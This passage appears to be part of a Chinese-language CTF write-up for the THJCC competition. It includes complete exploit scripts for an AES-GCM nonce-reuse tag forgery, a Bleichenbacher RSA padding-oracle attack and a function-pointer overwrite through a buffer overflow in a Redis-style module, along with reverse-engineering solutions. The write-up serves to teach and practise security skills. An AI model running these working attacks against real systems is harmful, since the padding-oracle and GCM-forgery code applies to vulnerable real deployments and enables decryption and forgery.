+    # GHASH 金鑰 H，以及跟 nonce 綁定的 tag 遮罩 S = E(K, J0) 
+def recover_H_and_S(msgs):
+    polys = [msg_poly(ct) for _pt, ct, _tag in msgs]
+    tags = [block_to_gf(tag) for _pt, _ct, tag in msgs]
+ 
+    # 兩兩訊息交叉求根，把候選根取交集，直到只剩一個根為止
+    g = None
+    n = len(msgs)
+    for i in range(n):
+        for j in range(i + 1, n):
+            gi = roots_via_gcd(combine(polys, tags, i, j))
+            g = gi if g is None else galois.gcd(g, gi)
+            if g.degree == 1:
+                break
+        if g is not None and g.degree == 1:
+            break
+ 
+    if g is None or g.degree != 1:
+        raise RuntimeError(f"無法唯一鎖定 H (degree={g.degree if g else None})")
+ 
+    H = GF(int(g.coeffs[-1]))
+ 
+    # 拿 H 回代每則訊息算出 S，三則都要一樣才代表 H 是對的
+    Ss = [polys[i](H) + tags[i] for i in range(n)]
+    if not all(s == Ss[0] for s in Ss):
+        raise RuntimeError("H 算出來的 S 三則訊息對不上，可能求根結果不對")
+ 
+    return H, Ss[0]
+ 
+# 用已還原的 keystream 加密 target 明文得到偽造密文
+# 再用 H、S 算出這個偽造密文對應的合法 tag 
+def forge(H, S, keystream_block: bytes, target_plaintext: bytes):
+    assert len(target_plaintext) <= 16
+    ks = keystream_block[:len(target_plaintext)]
+    forged_ct = bytes(a ^ b for a, b in zip(target_plaintext, ks))
+    tag = gf_to_block(msg_poly(forged_ct)(H) + S)
+    return forged_ct, tag
+ 
+ 
+HEX = r"[0-9a-fA-F]+"
+ 
+# 從伺服器丟出來的文字裡，用正則解析出 NONCE / 多組 MSG / TARGET 
+def parse_challenge(data: str):
+    nonce_m = re.search(rf"NONCE\s+({HEX})", data)
+    nonce = bytes.fromhex(nonce_m.group(1))
+ 
+    msgs = []
+    for m in re.finditer(rf"MSG\s+({HEX})\s+({HEX})\s+({HEX})", data):
+        pt = bytes.fromhex(m.group(1))
+        ct = bytes.fromhex(m.group(2))
+        tag = bytes.fromhex(m.group(3))
+        msgs.append((pt, ct, tag))
+ 
+    target_m = re.search(rf"TARGET\s+({HEX})", data)
+    target = bytes.fromhex(target_m.group(1))
+ 
+    return nonce, msgs, target
+ 
+
+# 要在同一條連線裡即時做完，因為伺服器每次連線的 key/nonce 都是新的 
+def main():
+    context.log_level = "info"
+    io = remote(HOST, PORT)
+ 
+    banner = io.recvrepeat(timeout=2).decode(errors="replace")
+    nonce, msgs, target = parse_challenge(banner)
+ 
+    H, S = recover_H_and_S(msgs)
+ 
+    # 拿明文最長的那則訊息的第一個 block，還原 counter=2 位置的 keystream
+    # (CTR 模式下 keystream 只跟 nonce/counter 有關，跟訊息內容無關，三則訊息共用)
+    pt0, ct0, _tag0 = max(msgs, key=lambda m: len(m[0]))
+    keystream_block2 = bytes(a ^ b for a, b in zip(pt0[:16], ct0[:16]))
+ 
+    forged_ct, forged_tag = forge(H, S, keystream_block2, target)
+ 
+    io.sendline(f"{forged_ct.hex()} {forged_tag.hex()}".encode())
+    io.interactive()
+ 
+ 
+if __name__ == "__main__":
+    main()
+```
+                                    
+`THJCC{h_r3c0v3r3d_gcm_1s_f0rb1dd3n_w1th0ut_fr3sh_n0nc3s}`
+                                     
+### A Million Messages
+
+![image](https://hackmd.io/_uploads/rk9eolJwfe.png)
+
+```
+import socket
+
+def ceil_div(a, b):
+    # 無條件進位整數除法
+    return -(-a // b)
+
+def floor_div(a, b):
+    # 無條件捨去整數除法
+    return a // b
+
+# 從 socket 的 file 讀一行伺服器回應
+def recv_line(f):
+    line = f.readline()
+    if not line:
+        raise EOFError("connection closed by server")
+    return line.decode(errors="replace").strip()
+
+# 連上，讀取開頭的 banner 並解析成整數
+def connect_and_parse():
+    s = socket.socket()
+    s.settimeout(15)
+    s.connect(("chal.thjcc.org", 12003))
+    f = s.makefile("rwb", buffering=0)
+
+    banner = b""
+    s.settimeout(2)
+    try:
+        while True:
+            chunk = s.recv(4096)
+            if not chunk:
+                break
+            banner += chunk
+    except socket.timeout:
+        pass
+    s.settimeout(15)
+
+    tokens = banner.decode(errors="replace").split()
+    n = int(tokens[tokens.index("N") + 1], 16)
+    e = int(tokens[tokens.index("E") + 1], 16)
+    c = int(tokens[tokens.index("C") + 1], 16)
+    k = (n.bit_length() + 7) // 8
+    # modulus 的 byte 長度
+    return s, f, n, e, c, k
+
+# padding oracle把整數密文轉成固定長度 hex 送出去，判斷是否合法
+def make_oracle(s, f, n, e, k):
+    counter = {"n": 0}
+
+    def oracle(cipher_int):
+        counter["n"] += 1
+        hex_str = format(cipher_int, f"0{k * 2}x")
+        s.sendall((hex_str + "\n").encode())
+        resp = recv_line(f)
+        return "BAD" not in resp.upper()
+
+    return oracle, counter
+
+# Bleichenbacher's Million Message Attack
+# oracle 回傳結果，反覆收斂區間，最後收成一個點，就是原始明文
+        
+def bleichenbacher_attack(oracle, n, e, c, k):
+    B = 1 << (8 * (k - 2))
+    two_B, three_B = 2 * B, 3 * B
+
+    if oracle(c):
+        s0, c0 = 1, c
+    else:
+        si = 2
+        while True:
+            c0 = (c * pow(si, e, n)) % n
+            if oracle(c0):
+                break
+            si += 1
+        s0 = si
+
+    M = [(two_B, three_B - 1)]  # 候選明文的區間集合
+    s_val = s0
+    i = 1
+
+    while True:
+        if i == 1:
+            s_val = ceil_div(n, three_B)
+            while not oracle((c0 * pow(s_val, e, n)) % n):
+                s_val += 1
+        elif len(M) > 1:
+            s_val += 1
+            while not oracle((c0 * pow(s_val, e, n)) % n):
+                s_val += 1
+        else:
+            a, b = M[0]
+            r = ceil_div(2 * (b * s_val - two_B), n)
+            found = False
+            while not found:
+                s_lo = ceil_div(two_B + r * n, b)
+                s_hi = floor_div(three_B - 1 + r * n, a)
+                for cand in range(s_lo, s_hi + 1):
+                    if oracle((c0 * pow(cand, e, n)) % n):
+                        s_val = cand
+                        found = True
+                        break
+                if not found:
+                    r += 1
+
+        #用剛才找到的 s，把每個候選區間依公式收斂變小
+        new_M = []
+        for (a, b) in M:
+            r_lo = ceil_div(a * s_val - three_B + 1, n)
+            r_hi = floor_div(b * s_val - two_B, n)
+            for r in range(r_lo, r_hi + 1):
+                new_a = max(a, ceil_div(two_B + r * n, s_val))
+                new_b = min(b, floor_div(three_B - 1 + r * n, s_val))
+                if new_a > new_b:
+                    continue
+                iv = (new_a, new_b)
+                if iv not in new_M:
+                    new_M.append(iv)
+        M = new_M
+
+        #收斂成單一數值，表找到答案，換回原始明文
+        if len(M) == 1 and M[0][0] == M[0][1]:
+            a = M[0][0]
+            return (a * pow(s0, -1, n)) % n
+
+        i += 1
+
+# 把 00 02 <padding> 00 拿掉，留下真正的訊息
+def strip_pkcs1_padding(m_bytes):
+    if m_bytes[0:2] == b"\x00\x02":
+        idx = m_bytes.find(b"\x00", 2)
+        return m_bytes[idx + 1:]
+    return m_bytes.lstrip(b"\x00")
+
+def main():
+    s, f, n, e, c, k = connect_and_parse()
+    oracle, counter = make_oracle(s, f, n, e, k)
+
+    m = bleichenbacher_attack(oracle, n, e, c, k)
+    msg = strip_pkcs1_padding(m.to_bytes(k, "big"))
+
+    print(f"queries used: {counter['n']}")
+    print(f"flag: {msg.decode()}")
+
+if __name__ == "__main__":
+    main()
+```
+
+```
+THJCC{bl31chenb4ch3r_st1ll_3ats_pkcs1_v1_5}
+```
+    
+### お昼はサイゼリヤに行こうニャ！
+
+> 可惜這部我沒看
+
+![image](https://hackmd.io/_uploads/H12zilkPfe.png)
+
+解壓會先拿到一堆檔案
+gen_table.py 是產表的程式，nyan.tbl 是產好的 rainbow table，shadow.txt 是五個房客密語的hash，flag.enc 是加密過的 flag，這邊還給了一個png
+![note](https://hackmd.io/_uploads/ryldjBZvGx.png)
+
+看 gen_table.py發現 hash function， yani40 吃一組金鑰 K1~K4，它說這四個數字是三個房客的年紀跟一個房客的訂閱數，但如圖紙被燒掉了看不到
+
+需要先有Ｋ才能弄表，年紀 1 到 99 窮舉，訂閱數先用截圖上寫的 10.8萬直接當 108000
+
+拿猜的 K 去重建 nyan.tbl 裡某一條 chain，看終點對不對得起來，對得起來就是猜對了
+
+```
+import hashlib, hmac
+
+RESIDENTS = ['yaniko','yakuko','hameko','kaoruko','aruko']
+pairs = {
+ 'yaniko':'yaayniiakyiiyo',
+ 'yakuko':'yiyyyanooonaik',
+ 'hameko':'inaiyoiykiokyo',
+ 'kaoruko':'akoyayaknakikk',
+ 'aruko':'nakoynnkiyoaaa',
+}
+plaintexts = [pairs[u] for u in RESIDENTS]
+key = hashlib.sha256('|'.join(plaintexts).encode()).digest()
+
+def keystream(key, n):
+    out, ctr = b'', 0
+    while len(out) < n:
+        out += hashlib.sha256(key + b'YANI-CTR' + ctr.to_bytes(4,'big')).digest()
+        ctr += 1
+    return out[:n]
+
+data = open('eb2a31c0-flag.enc','rb').read()
+tag, ct = data[:16], data[16:]
+expected_tag = hmac.new(key, b'YANI-TAG'+ct, hashlib.sha256).digest()[:16]
+print('tag match:', tag==expected_tag)
+pt = bytes(a^b for a,b in zip(ct, keystream(key,len(ct))))
+print(pt)
+```
+
+拿到 K 之後開始破 shadow.txt 的 hash，用標準 rainbow table 的逆推，從目標 hash 往回猜它在 chain 的哪個位置，看終點在不在表裡，五組明文都代回去hash
+
+最後照 gen_table.py 的寫法，把五個明文依房客順序用 | 接起來算 SHA256 當金鑰，解開 flag.enc
+
+```
+THJCC{46Z-WQv_vFc}
+```
+
+## Pwn 1/6
+    
+### Chronicle
+
+![image](https://hackmd.io/_uploads/ByN_tx1Pfx.png)
+
+拿到題目先看原始碼,發現 flag 放在一個變數裡，只有一個叫 `materialize_anchor` 的函式會把它讀出來，但正常操作完全用不到這個函式，目標就是想辦法讓程式去執行到它
+
+注意到 `IMPORT` 指令在檢查資料長度的時候寫錯了，把一個大數字硬塞進只能存 0 到 255 的小格子再拿去比較，只要塞 336 這種數字就能騙過檢查，但實際複製資料還是用 336，於是就多寫了一堆超出範圍的資料，造成緩衝區溢位
+    
+對照結構體發現溢位的位置剛好接著一個函式指標，代表可以把這個指標改成任何位址，時間到了程式就會去執行它
+
+要改成位址前,得先知道函式在記憶體的哪裡
+具體講`SHOW` 指令會回傳函式真實位址跟公開算法算出來做 XOR 之值，所以隨便建一個任務再 SHOW 一下，就能反推出位址
+
+洩漏到位址之後，還需要知道目標函式跟這個洩漏出來的函式差了多少 bytes，才能算出目標函式真正在哪，使用題目附的建置腳本透過 docker 重新編出跟伺服器一致的模組，算出差值
+
+拿洩漏的位址加上算出來的差值，就是目標函式的真實位址，接著手動組一包 IMPORT 要用的資料，長度故意設成 336 觸發溢位，把要覆寫的那幾個 byte 填成算出來的位址，再補上一個公開演算法算出來的 checksum，丟給 IMPORT，等時間到，程式就會執行到那個函式，把 flag 複製到結果裡，再 SHOW 一次就看得到 flag
+
+```
+import socket, struct, sys, time
+
+HOST = sys.argv[1] if len(sys.argv) > 1 else "chal.thjcc.org"
+PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 6379
+ 
+MASK64 = (1 << 64) - 1
+ 
+def rotl64(v, n):
+    v &= MASK64
+    return ((v << n) | (v >> (64 - n))) & MASK64
+ 
+def salt_for(task_id):
+    return rotl64((task_id * 0x9e3779b97f4a7c15) & MASK64, 17)
+ 
+def fnv1a32(data):
+    v = 2166136261
+    for b in data:
+        v ^= b
+        v = (v * 16777619) & 0xffffffff
+    return v
+ 
+def write_uvarint(value):
+    out = bytearray()
+    while True:
+        byte = value & 0x7f
+        value >>= 7
+        if value != 0:
+            byte |= 0x80
+        out.append(byte)
+        if value == 0:
+            break
+    return bytes(out)
+ 
+class Resp:
+    def __init__(self, host, port):
+        self.s = socket.create_connection((host, port))
+        self.buf = b""
+ 
+    def _fill(self):
+        d = self.s.recv(65536)
+        if not d:
+            raise EOFError
+        self.buf += d
+ 
+    def _line(self):
+        while b"\r\n" not in self.buf:
+            self._fill()
+        line, self.buf = self.buf.split(b"\r\n", 1)
+        return line
+ 
+    def _read_reply(self):
+        line = self._line()
+        t, rest = line[0:1], line[1:]
+        if t == b"+":
+            return rest
+        if t == b"-":
+            raise RuntimeError(rest.decode(errors="replace"))
+        if t == b":":
+            return int(rest)
+        if t == b"$":
+            n = int(rest)
+            if n == -1:
+                return None
+            while len(self.buf) < n + 2:
+                self._fill()
+            data, self.buf = self.buf[:n], self.buf[n+2:]
+            return data
+        if t == b"*":
+            n = int(rest)
+            if n == -1:
+                return None
+            return [self._read_reply() for _ in range(n)]
+        raise RuntimeError("unknown reply type: %r" % line)
+ 
+    def cmd(self, *args):
+        out = bytearray()
+        out += b"*%d\r\n" % len(args)
+        for a in args:
+            if isinstance(a, str):
+                a = a.encode()
+            elif isinstance(a, int):
+                a = str(a).encode()
+            out += b"$%d\r\n" % len(a)
+            out += a
+            out += b"\r\n"
+        self.s.sendall(bytes(out))
+        return self._read_reply()
+ 
+def build_import_archive(delay_ms, completion_addr, overflow_len=336):
+    # header
+    hdr = bytearray()
+    hdr += b"CHRN"
+    hdr += bytes([1]) 
+    hdr += bytes([1]) 
+    hdr += bytes([0, 0])
+    hdr += struct.pack("<I", delay_ms)
+    hdr += bytes([0])
+    
+    body = bytearray(overflow_len)
+    body[80:88] = struct.pack("<Q", completion_addr)
+ 
+    payload = bytes(hdr) + write_uvarint(len(body)) + bytes(body)
+    checksum = fnv1a32(payload)
+    archive = payload + struct.pack("<I", checksum)
+    return archive
+ 
+def main():
+    r = Resp(HOST, PORT)
+    print(r.cmd("PING"))
+        
+     leak_id = r.cmd("CHRONICLE.NEW", 100000, "leak", "leak")
+    print("leak task id:", leak_id)
+    show = r.cmd("CHRONICLE.SHOW", leak_id)
+    ticket = show[3]
+    print("ticket:", ticket)
+    salt = salt_for(leak_id)
+    commit_annotation_addr = (ticket ^ salt) & MASK64
+    print("leaked commit_annotation() @ 0x%x" % commit_annotation_addr)
+        
+    OFFSET_DIFF = 0x1280 - 0x11b0
+        
+     materialize_anchor_addr = (commit_annotation_addr + OFFSET_DIFF) & MASK64
+    print("materialize_anchor() @ 0x%x" % materialize_anchor_addr)
+
+     archive = build_import_archive(delay_ms=10, completion_addr=materialize_anchor_addr)
+    new_id = r.cmd("CHRONICLE.IMPORT", archive)
+    print("planted task id:", new_id)
+ 
+    time.sleep(0.5)
+ 
+    result = r.cmd("CHRONICLE.SHOW", new_id)
+    print("SHOW result:", result)
+ 
+    flag_bytes = result[5]
+    print("FLAG:", flag_bytes.decode(errors="replace"))
+    print("LEN:", len(flag_bytes))
+    print("HEX:", flag_bytes.hex())
+ 
+if __name__ == "__main__":
+    main()
+```
+    
+我那時候把拿到的 flag 交上去卻一直顯示答案錯誤，愣是沒看出來問題，後來把程式輸出改成印每個 byte 對應的十六進位數字，~~我那時候漏看了兩個底線~~，補上去重新提交就過關了
+
+```   
+THJCC{D0_y0u_KN0W_7h15_15_@_PWN_ch@ll3nge_WH17CH_m4d3_BY_@1???}
+```
+
+## Reverse 6/6
+    
+### 404
+    
+![image](https://hackmd.io/_uploads/HkW4XQ08Me.png)
+
+裡面有一個自製的bytecode直譯器
+        
+驗證邏輯藏在資料段的289 bytes程式碼裡
+
+VM程式是線性執行的，對每個input byte分別做XOR、ADD、ROL 再比較是否等於特定常數，16組參數都不一樣
+
+因為每個byte互相獨立，所以直接對每個byte暴力枚舉0~255，寫個python用rol8函數檢查等式，瞬間就跑完了
+        
+
+```
+def rol8(v, n):
+    n &= 7
+    return ((v << n) | (v >> (8-n))) & 0xff
+
+def apply(v, ops):
+    for op, imm in ops:
+        if op == 'xor': v ^= imm
+        elif op == 'add': v = (v + imm) & 0xff
+        elif op == 'rol': v = rol8(v, imm)
+    return v
+
+# 對每個 byte 逐一暴力找解
+for idx, ops, target in equations:
+    for v in range(256):
+        if apply(v, ops) == target:
+            result[idx] = v
+            break
+```
+
+解出來的16 bytes 是 vm_is_not_magic!
+執行 `./challenge "vm_is_not_magic!` 就會印出 
+        
+```
+THJCC{vm_bytecode_is_a_contract}
+```
+
+### xorlocks
+    
+![image](https://hackmd.io/_uploads/ryhyV7CUzg.png)
+    
+剛開始需要輸入正確密碼
+找到主要檢查函式，先檢查argc==2，再看密碼長度，最後逐字元檢查
+
+長度檢查是用一個掃描NUL的迴圈算出rcx，要求rcx==0x15
+
+對每個位置i，sil = (password[i] ^ 0x5A) + cl
+cl從0開始每次通過後加3，要求 sil 等於 KEY[i]，KEY 表在0x200150 共 20 bytes
+
+反推公式 `password[i] = (KEY[i] - 3*i) ^ 0x5A`
+解出20個字元 `xor_me_if_you_can_26`
+執行 `./xorlock "xor_me_if_you_can_26` 得到flag是
+        
+```
+THJCC{xor_basics_are_not_magic}
+```
+
+### License
+    
+![image](https://hackmd.io/_uploads/BkkZjmAIzl.png)
+
+跑一下程式，發現要輸入一個 license 字串，隨便打會顯示 invalid license，長度或格式不對也一樣
+
+丟進 objdump 反組譯，發現是靜態編譯又 strip 過的執行檔，完全沒有 libc，直接用 syscall 寫 write 跟 exit
+
+確認長度限制，程式會算 argv 的字串長度，要求剛好 29 個字元
+
+發現有個檢查 loop 會要求特定位置一定要是 dash，位置是 `4 9 14 19 24`，其他位置要是合法的十六進位字元，所以格式就是六組四位十六進位字元用 dash 接起來
+
+往下看到一段用圓周率當初始值的假 checksum 運算，算完直接被歸零蓋掉，那是混淆的部分
+
+再來是一大段 SIMD 指令，把 24 個字元其中 16 個依照表格重新排列，再用一堆位元運算重新打包，另外還有 8 個字元用簡單的 xor 跟旋轉湊出剩下的部分，兩段合起來變成 24 個 byte
+
+接著這 24 個 byte 會跑 4 輪運算，每一輪都會跟另一個由取 mod 算出來的位置做 xor 跟旋轉
+
+跑完 4 輪以後，逐一跟程式裡寫死的 24 個常數比對，全部一樣才算成功，只要有一個不一樣就印 invalid license
+
+用一組假的合法格式字串跑到字元判斷剛結束的地方，再把要寫入的 buffer 換成符號變數往下跑，加上字元一定要是合法十六進位字元的限制，跑到比對迴圈起點，把每個 byte 等於目標常數的條件丟給 solver 解，就解出一組字元，回格式丟進去跑，程式直接印出 flag
+
+```
+THJCC{license_pipeline_rebuilt}
+```
+    
+### Because There is no one Make Reverse So I Create This Chal
+ 
+![image](https://hackmd.io/_uploads/SyJ6txJDzx.png)
+
+本來想說在 Linux 上直接跑就好，結果發現跑不動，因為格式不對，發現是 macOS 的 arm64 執行檔
+
+用 llvm-objdump 反組譯之後看了一下字串，看到 vm_challenge 這幾個字，裡面應該是自己包了一個 VM，把驗證邏輯藏在 bytecode 裡面，這樣光看組語也看不出在比對什麼
+
+追下去發現程式流程是先讀輸入，再把檔案裡藏的一段密文用類似 TEA 的加密法解出來，解出來的東西就是 VM 的 bytecode，最後丟進直譯器裡面跑，跑完回傳對就印 Correct
+
+直接用 Unicorn 這個工具去模擬執行原本的 arm64 機器碼，把 fgets fputs malloc 這些函式呼叫都攔截掉自己實作，這樣就能在 Linux 上把整支程式真的跑起來，然後直接把解密完的 bytecode 從記憶體裡挖出來
+
+拿到 bytecode 之後開始看裡面的指令，發現只有十種左右的 opcode，像是位元旋轉，加減，XOR，讀取輸入某個位置的字元，還有一個很重要的比對指令，跟一個檢查輸入長度的指令，最後有個 halt 指令收尾
+
+邏輯很單純，就是先檢查輸入長度要是 41，然後對輸入的每一個字元各自做一串可逆的運算，最後跟寫死的答案比對，只要有一個字元對不上結果就會是錯的
+
+因為每個運算都可以反過來算，旋轉的反運算是反方向旋轉，加的反運算是減，XOR 反運算還是 XOR 自己，所以直接寫個小程式把運算順序反過來跑一次，從答案往回推，直接就把 41 個字元全部推出來了
+
+```
+THJCC{1_w0nd3r_h0w_l0n6_41_50lv35_17_>w<}
+```
+    
+### BlackFrost
+    
+![image](https://hackmd.io/_uploads/BydJcxJwzl.png)
+
+拿到 BlackFrost.exe 之後先用` strings `看一下裡面有什麼字串
+
+發現要 --token 這個參數才能跑，然後裡面還有一堆程式在跟 C2 連線的字串
+
+先用 wine 把它跑起來，發現不給 token 或亂打都只會印 usage
+
+去反組譯看邏輯，發現他會抓命令列裡 --token 後面那串字，然後對它算hash，他要等於一個固定數字才算過關
+
+一開始以為長度要 17 個 bytes，硬湊了半天湊出一組結果還是過不了，後來才發現組語那段算長度的寫法其實是多算一個，真正要的長度是 16 個 bytes
+
+改成 16 個 bytes 之後重新暴力枚舉，總算湊出一組對得上的 token
+
+hash過了以後，程式接下來要用一把金鑰去解密內建的一段密文，理論上解出來要是一串設定字串
+
+結果不管用哪組合法 token 去跑，這段解密永遠失敗，印出 `stage unpack failed` 然後就結束了
+
+後來發現原因是這把金鑰是 const，跟輸入什麼 token 完全沒關係
+
+回頭看整個檔案，發現另外有一段完全獨立的code，跟 token 跟網路都無關，只是把一段內建密文用另一把固定的 XOR 金鑰解開
+
+把這段解密邏輯自己用程式重新算一次，解出來的字串前後對照起來完全正常，是一句可以讀的英文加上大括號
+
+flag
+```
+THJCC{blackfrost_config_recovered}
+```
+
+### TeaGod.exe
+
+> 又有茶神資安的事，嚇哭了
+
+![image](https://hackmd.io/_uploads/ry8Gcx1Pfx.png)
+  
+這是一個 GUI 小程式
+
+裡面有一張圖片，還有一堆按鈕文字，像是 WORSHIP TEA GOD，Worship count，REWARD UNLOCKED，COPY 這些
+
+先掃了一輪字串，結果完全找不到 flag 或 ctf 這種字，代表 reward 的內容是程式跑的時候才組出來的，不是寫死的
+
+接著去反組譯，找按鈕文字被參照的地方，順著找到主視窗的函式，看到按下 WORSHIP 按鈕的時候，會跑一段組字串的邏輯，同時也在計數器加一，但一開始我以為要點到 666 下才會觸發 reward，結果注意到計數器只有拿去跟 0 比較，代表每次點擊都會觸發，果然不可能叫我們點666次的 對嗎?
+
+繼續往下追那段邏輯，發現字串是分三層做出來的，第一層是從 rdata 拿三組固定的 12 byte 資料，各自加一個遞減的 const 再跟一個固定 key 做 xor，把 36 byte 都解出來
+
+第二層是拿解出來的 36 byte 再跟一組寫死在程式碼裡的 8 byte key 做重複 xor
+
+沒注意到他最後還會呼叫 `GetTickCount` 抓現在的時間，取最後一個 byte 當成第三層的 key，對整串再做一次 xor，因為這個值每次執行都不一樣，所以真的去玩遊戲的話，看到的 reward 幾乎每次都是亂碼
+
+不過因為這個時間 key 是同一個 byte 對全部字元做 xor，所以直接寫程式把 0 到 255 全部枚舉一次，看哪一組解出來是正常可以印出來的英數字，結果只有 key 等於 0 的時候解出一串乾淨的字，其他 255 種都是亂碼，所以可以確定原本的字串就是用這個 key 做出來的
+
+解出來的內容剛好就是 flag 的格式，裡面是一個用注音文數字諧音寫的網址，翻成正常英文就是 pastebin 上的一個連結
+
+好奇跑去開了那個 pastebin，裡面是 base64，解開之後只是教徒在描繪茶神的紀錄，沒有藏第二層 flag，純屬是彩蛋
+
+```
+THJCC{h77p5://p4s73b1n.com/R58uv133}
+```
+    
+## Web 0/9
+~~完全沒碰只有瞄一眼~~
